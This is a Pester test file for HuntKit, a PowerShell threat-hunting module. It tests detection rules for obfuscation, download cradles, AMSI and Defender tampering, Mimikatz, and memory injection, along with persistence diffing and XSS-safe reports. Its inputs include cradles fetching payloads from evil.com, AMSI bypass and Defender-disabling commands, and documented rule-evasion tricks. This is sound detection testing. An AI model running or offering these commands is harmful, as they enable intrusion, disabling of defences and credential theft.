#Requires -Modules @{ ModuleName='Pester'; ModuleVersion='5.5.0' }
<#
.SYNOPSIS
    Tests Pester v5 para HuntKit v0.2.0.
.DESCRIPTION
    Cubre logica pura (sin acceso a sistema real donde es posible):
    - Get-HuntId: formato, determinismo, unicidad
    - ConvertTo-PersistenceItem: estructura del objeto
    - Test-ScriptBlockText: todas las reglas SB001-SB011 + regla compuesta SB100
      incluyendo casos de evasion documentados
    - Compare-PersistenceSnapshot: Added, Removed, sin cambios
    - Save/Get-PersistenceDrift con Run Key real (requiere Windows)
    - Export-HuntReport: genera HTML, HtmlEncode previene XSS
#>

BeforeAll {
    $modulePath = Join-Path $PSScriptRoot '..\HuntKit\HuntKit.psd1'
    Import-Module $modulePath -Force -ErrorAction Stop
}

AfterAll {
    Remove-Module HuntKit -ErrorAction SilentlyContinue
}

# ── Helper Get-HuntId ──────────────────────────────────────────────────────────
Describe 'Get-HuntId' {
    It 'Devuelve exactamente 16 caracteres hexadecimales' {
        $id = InModuleScope HuntKit { Get-HuntId 'test' }
        $id | Should -Match '^[a-f0-9]{16}$'
    }

    It 'Es determinista para la misma entrada' {
        $a = InModuleScope HuntKit { Get-HuntId 'mismo-input' }
        $b = InModuleScope HuntKit { Get-HuntId 'mismo-input' }
        $a | Should -BeExactly $b
    }

    It 'Produce valores distintos para entradas distintas' {
        $a = InModuleScope HuntKit { Get-HuntId 'notepad.exe' }
        $b = InModuleScope HuntKit { Get-HuntId 'calc.exe' }
        $a | Should -Not -Be $b
    }

    It 'Un cambio en el comando genera un Id diferente (base del diff)' {
        $orig = InModuleScope HuntKit { Get-HuntId 'RunKey|HKCU:\Run|MyApp|notepad.exe' }
        $mod  = InModuleScope HuntKit { Get-HuntId 'RunKey|HKCU:\Run|MyApp|evil.exe' }
        $orig | Should -Not -Be $mod
    }
}

# ── ConvertTo-PersistenceItem ──────────────────────────────────────────────────
Describe 'ConvertTo-PersistenceItem' {
    It 'Devuelve objeto con todas las propiedades requeridas' {
        $item = InModuleScope HuntKit {
            ConvertTo-PersistenceItem -Type 'RunKey' -Location 'HKCU:\Run' `
                -Name 'Test' -Command 'notepad.exe' -Mitre 'T1547.001'
        }
        $item.Id      | Should -Match '^[a-f0-9]{16}$'
        $item.Type    | Should -Be 'RunKey'
        $item.Mitre   | Should -Be 'T1547.001'
        $item.Extra   | Should -Be ''
    }

    It 'El Id es estable (no aleatorio)' {
        $a = InModuleScope HuntKit {
            ConvertTo-PersistenceItem -Type 'RunKey' -Location 'HKCU:\Run' `
                -Name 'App' -Command 'app.exe' -Mitre 'T1547.001'
        }
        $b = InModuleScope HuntKit {
            ConvertTo-PersistenceItem -Type 'RunKey' -Location 'HKCU:\Run' `
                -Name 'App' -Command 'app.exe' -Mitre 'T1547.001'
        }
        $a.Id | Should -BeExactly $b.Id
    }
}

# ── Test-ScriptBlockText (logica pura, sin WinEvent) ──────────────────────────
Describe 'Test-ScriptBlockText - Reglas individuales' {

    Context 'SB001 - Base64 decode (T1027)' {
        It 'Detecta FromBase64String' {
            $hits = 'x=[Convert]::FromBase64String("abc")' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB001' | Should -Not -BeNullOrEmpty
        }
        It 'No produce falso positivo en comandos comunes' {
            $hits = 'Get-Process | Where-Object CPU -gt 10' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB001' | Should -BeNullOrEmpty
        }
    }

    Context 'SB002 - Encoded command (T1059.001)' {
        It 'Detecta -enc con Base64 largo' {
            $hits = 'powershell.exe -enc aABlAGwAbABvAHcAbwByAGwAZAA=' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB002' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta -EncodedCommand (nombre completo)' {
            $hits = 'powershell.exe -EncodedCommand aABlAGwAbABvAHcAbwByAGwAZAA=' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB002' | Should -Not -BeNullOrEmpty
        }
        It 'No dispara con Base64 corto (< 20 chars, reduce falsos positivos)' {
            $hits = 'powershell -enc abc123' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB002' | Should -BeNullOrEmpty
        }
    }

    Context 'SB003 - IEX / Invoke-Expression (T1059.001)' {
        It 'Detecta iex en minusculas' {
            $hits = 'iex $payload' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB003' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta Invoke-Expression (nombre completo)' {
            $hits = 'Invoke-Expression $code' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB003' | Should -Not -BeNullOrEmpty
        }
        It 'No dispara en nombres que contienen "iex" como substring' {
            # "fiex" no debe coincidir; \b exige limite de palabra
            $hits = 'Get-Fiex -Name test' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB003' | Should -BeNullOrEmpty
        }
    }

    Context 'SB004 - Download cradle (T1105)' {
        It 'Detecta Net.WebClient' {
            $hits = '(New-Object Net.WebClient).DownloadString("http://x")' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB004' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta Invoke-WebRequest (iwr)' {
            $hits = 'iwr http://evil.com/shell.ps1 -o shell.ps1' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB004' | Should -Not -BeNullOrEmpty
        }
    }

    Context 'SB005 - AMSI tampering (T1562.001)' {
        It 'Detecta AmsiUtils' {
            $hits = '$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB005' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta amsiInitFailed' {
            $hits = '$field.SetValue($null,$true) # amsiInitFailed bypass' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB005' | Should -Not -BeNullOrEmpty
        }
    }

    Context 'SB006 - Defender disable/exclusion (T1562.001)' {
        It 'Detecta Set-MpPreference -DisableRealtimeMonitoring' {
            $hits = 'Set-MpPreference -DisableRealtimeMonitoring $true' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB006' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta Add-MpPreference -ExclusionPath' {
            $hits = 'Add-MpPreference -ExclusionPath C:\Temp' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB006' | Should -Not -BeNullOrEmpty
        }
    }

    Context 'SB007 - Reflective assembly load (T1620)' {
        It 'Detecta [Reflection.Assembly]::Load' {
            $hits = '$asm=[Reflection.Assembly]::Load($bytes)' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB007' | Should -Not -BeNullOrEmpty
        }
    }

    Context 'SB008 - Win32 memory API (T1055)' {
        It 'Detecta VirtualAlloc' {
            $hits = '$addr=[Kernel32]::VirtualAlloc(0,$buf.Length,0x3000,0x40)' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB008' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta CreateRemoteThread' {
            $hits = '[Kernel32]::CreateRemoteThread($hProc,[IntPtr]::Zero,0,$addr,0,0,[ref]0)' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB008' | Should -Not -BeNullOrEmpty
        }
        It 'Severidad es High' {
            $hits = 'VirtualAlloc(0,4096,0x3000,0x40)' | Test-ScriptBlockText
            ($hits | Where-Object RuleId -eq 'SB008').Severity | Should -Be 'High'
        }
    }

    Context 'SB009 - Credential dumping (T1003.001)' {
        It 'Detecta Invoke-Mimikatz' {
            $hits = 'Invoke-Mimikatz -Command sekurlsa::logonpasswords' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB009' | Should -Not -BeNullOrEmpty
        }
        It 'Severidad es Critical' {
            $hits = 'sekurlsa::wdigest' | Test-ScriptBlockText
            ($hits | Where-Object RuleId -eq 'SB009').Severity | Should -Be 'Critical'
        }
    }

    Context 'SB010 - Hidden window / bypass (T1059.001)' {
        It 'Detecta -WindowStyle Hidden' {
            $hits = 'powershell -WindowStyle Hidden -File payload.ps1' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB010' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta ExecutionPolicy Bypass' {
            $hits = 'powershell -ExecutionPolicy Bypass -File go.ps1' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB010' | Should -Not -BeNullOrEmpty
        }
    }

    Context 'SB011 - Char-code obfuscation (T1027)' {
        It 'Detecta 3 o mas [char] consecutivos' {
            $hits = '$s=[char]105+[char]101+[char]120' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB011' | Should -Not -BeNullOrEmpty
        }
        It 'No dispara con menos de 3 [char]' {
            $hits = '$nl=[char]10+[char]13' | Test-ScriptBlockText
            $hits | Where-Object RuleId -eq 'SB011' | Should -BeNullOrEmpty
        }
    }
}

Describe 'Test-ScriptBlockText - Regla compuesta SB100' {
    It 'Download + IEX genera SB100 (cradle clasico)' {
        $text = 'iex((New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1"))'
        $hits = $text | Test-ScriptBlockText
        $hits | Where-Object RuleId -eq 'SB100' | Should -Not -BeNullOrEmpty
    }

    It 'SB100 tiene severidad High' {
        $text = 'iex((New-Object Net.WebClient).DownloadString("http://x/p"))'
        $hits = $text | Test-ScriptBlockText
        ($hits | Where-Object RuleId -eq 'SB100').Severity | Should -Be 'High'
    }

    It 'Solo download sin IEX no genera SB100' {
        $hits = '(New-Object Net.WebClient).DownloadFile("http://x","out.exe")' | Test-ScriptBlockText
        $hits | Where-Object RuleId -eq 'SB100' | Should -BeNullOrEmpty
    }

    It 'Solo IEX sin download no genera SB100' {
        $hits = 'iex $localVar' | Test-ScriptBlockText
        $hits | Where-Object RuleId -eq 'SB100' | Should -BeNullOrEmpty
    }
}

Describe 'Test-ScriptBlockText - Casos de evasion documentados' {
    # Estos tests documentan que las tecnicas de evasion EVADEN las reglas.
    # La honestidad sobre las limitaciones demuestra pensamiento adversarial.

    It '[EVASION] Concatenacion simple de string evade SB003' {
        # 'ie' + 'x' no matchea \biex\b como palabra completa en la concatenacion
        $evades = '"ie"+"x"' | Test-ScriptBlockText
        # La concatenacion en si no dispara IEX; el atacante evalua el resultado dinamicamente
        $evades | Where-Object RuleId -eq 'SB003' | Should -BeNullOrEmpty
    }

    It '[EVASION] DownloadString concatenado evade SB004' {
        $evades = '"Down"+"loadString"' | Test-ScriptBlockText
        $evades | Where-Object RuleId -eq 'SB004' | Should -BeNullOrEmpty
    }

    It '[DETECCION] Mimikatz con variacion de case igual se detecta (regex case-insensitive)' {
        # PowerShell -match es case-insensitive por defecto
        $hits = 'Invoke-MIMIKATZ -Command privilege::debug' | Test-ScriptBlockText
        $hits | Where-Object RuleId -eq 'SB009' | Should -Not -BeNullOrEmpty
    }
}

# ── Compare-PersistenceSnapshot (funcion pura) ────────────────────────────────
Describe 'Compare-PersistenceSnapshot' {

    BeforeAll {
        # Crear items sinteticos sin tocar el sistema
        $script:ItemA = InModuleScope HuntKit {
            ConvertTo-PersistenceItem -Type 'RunKey' -Location 'HKCU:\Run' `
                -Name 'AppA' -Command 'a.exe' -Mitre 'T1547.001'
        }
        $script:ItemB = InModuleScope HuntKit {
            ConvertTo-PersistenceItem -Type 'RunKey' -Location 'HKCU:\Run' `
                -Name 'AppB' -Command 'b.exe' -Mitre 'T1547.001'
        }
    }

    It 'Detecta un item Added' {
        $diff = Compare-PersistenceSnapshot -Baseline @($script:ItemA) -Current @($script:ItemA, $script:ItemB)
        $added = $diff | Where-Object Change -eq 'Added'
        $added | Should -Not -BeNullOrEmpty
        $added.Name | Should -Be 'AppB'
    }

    It 'Detecta un item Removed' {
        $diff = Compare-PersistenceSnapshot -Baseline @($script:ItemA, $script:ItemB) -Current @($script:ItemA)
        $removed = $diff | Where-Object Change -eq 'Removed'
        $removed | Should -Not -BeNullOrEmpty
        $removed.Name | Should -Be 'AppB'
    }

    It 'Sin cambios devuelve array vacio' {
        $diff = Compare-PersistenceSnapshot -Baseline @($script:ItemA) -Current @($script:ItemA)
        @($diff) | Should -HaveCount 0
    }

    It 'Baseline vacio: todo es Added' {
        $diff = Compare-PersistenceSnapshot -Baseline @() -Current @($script:ItemA, $script:ItemB)
        @($diff | Where-Object Change -eq 'Added') | Should -HaveCount 2
    }

    It 'Current vacio: todo es Removed' {
        $diff = Compare-PersistenceSnapshot -Baseline @($script:ItemA, $script:ItemB) -Current @()
        @($diff | Where-Object Change -eq 'Removed') | Should -HaveCount 2
    }

    It 'Un cambio de comando genera Removed + Added (no Modified)' {
        $ItemAmod = InModuleScope HuntKit {
            ConvertTo-PersistenceItem -Type 'RunKey' -Location 'HKCU:\Run' `
                -Name 'AppA' -Command 'evil.exe' -Mitre 'T1547.001'  # comando cambiado
        }
        $diff = Compare-PersistenceSnapshot -Baseline @($script:ItemA) -Current @($ItemAmod)
        ($diff | Where-Object Change -eq 'Removed') | Should -Not -BeNullOrEmpty
        ($diff | Where-Object Change -eq 'Added')   | Should -Not -BeNullOrEmpty
    }
}

# ── Save / Get-PersistenceDrift con Run Key real (Windows) ────────────────────
Describe 'Save-PersistenceBaseline / Get-PersistenceDrift (sistema real)' {

    BeforeAll {
        $script:BaselinePath = Join-Path $TestDrive 'baseline.json'
        $script:RegPath      = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    }

    It 'Guarda un JSON valido con estructura v2.0' {
        Save-PersistenceBaseline -Path $script:BaselinePath
        $script:BaselinePath | Should -Exist

        $wrapper = Get-Content $script:BaselinePath -Raw | ConvertFrom-Json
        $wrapper.Version  | Should -Be '2.0'
        $wrapper.Items    | Should -Not -BeNullOrEmpty
        $wrapper.IntegrityHash | Should -Match '^[a-f0-9]{16}$'
    }

    It 'Drift sin cambios devuelve array vacio' {
        $drift = @(Get-PersistenceDrift -BaselinePath $script:BaselinePath)
        $drift | Should -HaveCount 0
    }

    It 'Detecta Run Key anadida (T1547.001) y la clasifica correctamente' {
        Set-ItemProperty -Path $script:RegPath -Name 'HuntKitPesterTest_v2' -Value 'notepad.exe'
        try {
            $drift  = @(Get-PersistenceDrift -BaselinePath $script:BaselinePath)
            $added  = $drift | Where-Object { $_.Change -eq 'Added' -and $_.Name -eq 'HuntKitPesterTest_v2' }
            $added           | Should -Not -BeNullOrEmpty
            $added.Mitre     | Should -Be 'T1547.001'
            $added.Type      | Should -Be 'RunKey'
        }
        finally {
            Remove-ItemProperty -Path $script:RegPath -Name 'HuntKitPesterTest_v2' -ErrorAction SilentlyContinue
        }
    }
}

# ── Export-HuntReport (anti-XSS) ──────────────────────────────────────────────
Describe 'Export-HuntReport' {

    BeforeAll {
        $script:HtmlPath = Join-Path $TestDrive 'report.html'
        $script:Findings = @(
            [pscustomobject]@{ Change='Added'; Type='RunKey'; Mitre='T1547.001'; Name='Evil'; Command='evil.exe' }
        )
    }

    It 'Genera un archivo HTML' {
        Export-HuntReport -Findings $script:Findings -OutputPath $script:HtmlPath -Title 'Test Report'
        $script:HtmlPath | Should -Exist
    }

    It 'El HTML contiene el titulo' {
        $html = Get-Content $script:HtmlPath -Raw
        $html | Should -Match 'Test Report'
    }

    It 'ANTI-XSS: un payload con <script> en el valor no aparece sin codificar' {
        $xssPath = Join-Path $TestDrive 'xss_test.html'
        $xssFindings = @(
            [pscustomobject]@{
                Change  = 'Added'
                Name    = '<script>alert(1)</script>'
                Command = 'evil.exe'
                Mitre   = 'T1059'
            }
        )
        Export-HuntReport -Findings $xssFindings -OutputPath $xssPath -Title 'XSS Test'
        $html = Get-Content $xssPath -Raw

        # El tag <script> crudo NO debe aparecer (debe estar codificado como &lt;script&gt;)
        $html | Should -Not -Match '<script>alert\(1\)</script>'
        # Pero la version codificada SI debe estar presente
        $html | Should -Match '&lt;script&gt;'
    }

    It 'Reporte vacio genera HTML valido sin filas de tabla' {
        $emptyPath = Join-Path $TestDrive 'empty.html'
        Export-HuntReport -Findings @() -OutputPath $emptyPath -Title 'Empty'
        $emptyPath | Should -Exist
        $html = Get-Content $emptyPath -Raw
        $html | Should -Match 'Sin hallazgos'
    }
}
